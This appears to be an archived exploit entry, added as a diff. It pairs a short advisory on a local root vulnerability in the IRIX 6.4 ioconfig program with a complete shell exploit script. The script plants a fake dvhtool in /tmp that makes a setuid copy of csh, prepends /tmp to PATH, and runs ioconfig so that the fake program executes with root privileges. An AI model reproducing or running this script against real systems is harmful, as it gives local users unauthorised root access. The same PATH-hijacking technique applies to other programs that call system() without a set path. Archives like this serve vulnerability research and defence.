@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/213/info
+
+A vulnerability exists in the ioconfig program, as shipping with IRIX 6.4 S2MP from Silicon Graphics, Inc. This program is only available on Irix 6.4 for the Origin/Onyx2. Other machines running IRIX are not vulnerable.
+
+This vulnerability will allow a local user to obtain root priveledges. The ioconfig program will make calls to the system() call without setting the path to be used; this allows an attacker to alter their path to cause ioconfig to execute arbitrary programs. 
+
+#!/bin/sh
+#
+# Irix 6.4 ioconfig xploit - Loneguard 04/12/97
+#
+# Simple xploit making use of stupid system calls to programs without using
+# a path. This works on both /sbin/ioconfig and /sbin/disk_bandwidth.
+#
+cat > /tmp/dvhtool << 'EOF'
+#!/bin/sh
+/sbin/cp /bin/csh /tmp/xsh
+/sbin/chmod 14755 /tmp/xsh
+EOF
+/sbin/chmod 700 /tmp/dvhtool
+PATH=/tmp:$PATH
+/sbin/ioconfig -f /hw 
